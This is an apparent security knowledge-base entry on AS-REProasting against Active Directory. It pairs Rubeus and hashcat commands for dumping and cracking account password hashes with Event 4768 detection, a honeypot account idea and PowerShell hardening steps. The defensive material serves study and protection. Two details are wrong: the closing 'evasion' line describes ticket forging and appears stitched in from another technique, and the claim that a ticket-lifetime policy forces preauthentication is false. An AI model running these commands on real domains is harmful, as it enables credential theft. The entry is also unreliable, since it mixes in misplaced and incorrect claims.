name: AS-REProasting — Attack, Detection & Defense
description: AS-REProasting targets accounts with 'Do not require Kerberos preauthentication' enabled, obtaining crackable AS-REP hashes without credentials. Detection: Event 4768 with Pre-Authentication Type 0 and RC4 encryption (0x17). Prevention: enforce preauthentication, 20+ char passwords for affected accounts.
notes:
=== ATTACK ===
# Step 1: Extract hashes for all accounts with pre-auth disabled
.\Rubeus.exe asreproast /outfile:asrep.txt

# Step 2: Fix hash format for hashcat (add '23$' after '$krb5asrep$')
# Original:  $krb5asrep$anni@eagle.local:...
# Fixed:     $krb5asrep$23$anni@eagle.local:...
# (Edit the file manually or with sed)

# Step 3: Crack with hashcat
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
  → 18200 = Kerberos 5, etype 23 (RC4), AS-REP

# View cracked password
sudo cat asrepcrack.txt

=== DETECTION ===
Event ID 4768: Kerberos Authentication Ticket Requested
  → Pre-Authentication Type = 0 (no pre-auth) → suspicious
  → Ticket Encryption Type = 0x17 (RC4) when tools target weak encryption
  → Rubeus defaults to RC4 for AS-REProasting
  → Correlate source IP/VLAN against expected user location

Honeypot user criteria:
  → Old account (2+ years), old password (not changed recently)
  → Must have 'Do not require Kerberos preauthentication' enabled
  → Recent logins present (makes it believable)
  → Has some privileges assigned (makes it worthwhile to crack)
  → Any 4768 for this account = alert

=== PREVENTION ===
  → Only enable 'Do not require Kerberos preauthentication' when absolutely needed
  → Quarterly review of accounts with this property
  → Separate password policy for affected accounts: minimum 20 characters

examples.label: Extract AS-REP hashes for all pre-auth disabled accounts
Fix hash format for hashcat (add 23$ after $krb5asrep$)

recommended.note: Kerberoasting — similar offline hash cracking technique targeting SPN accounts.

defense.why_it_works: Accounts with 'Do not require Kerberos preauthentication' enabled return an AS-REP encrypted with the account's password hash to ANY requester. Because no pre-auth is required, an attacker gets a crackable hash without ever authenticating.
defense.prerequisites: Network access to the DC and a target account that has Kerberos pre-authentication disabled. No credentials required.
defense.impact: The cleartext password of the affected account after offline cracking.
defense.detection: Event 4768 (Kerberos Authentication Ticket Requested) with Pre-Authentication Type = 0 and Ticket Encryption Type 0x17 (RC4, which the tools default to). Correlate the source IP/VLAN against the user's expected location.
defense.artifacts: 4768 events with pre-auth type 0; an asrep.txt hash dump on the attacker host; Rubeus asreproast execution. A honeypot account with pre-auth disabled (old, believable, some privileges) fires 4768 on any request.
defense.prevention: Only enable 'Do not require Kerberos preauthentication' when absolutely necessary; review accounts carrying this flag quarterly; enforce a separate 20+ character password policy for affected accounts.
defense.misconfiguration: The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.
defense.vulnerable_config:
# Active Directory user account attribute (via ADUC or ADSI Edit)
# 'Do not require Kerberos preauthentication' = CHECKED
# In PowerShell:
Set-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true

# UAC flag value: 0x400000 (4194304)
# Confirmed with:
Get-ADUser svc_backup -Properties DoesNotRequirePreAuth
defense.secure_config:
# Enforce Kerberos pre-authentication (the secure default)
# In PowerShell:
Set-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false

# Bulk fix — find and fix all no-preauth accounts:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
  Set-ADAccountControl -DoesNotRequirePreAuth $false

# GPO path (Kerberos policy):
# Computer Configuration > Windows Settings > Security Settings >
# Account Policies > Kerberos Policy
# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)
defense.evasion: Forge/inject with AES keys (not RC4) and realistic lifetimes to match normal tickets; request tickets just before use; avoid extra SID history that trips MDI.
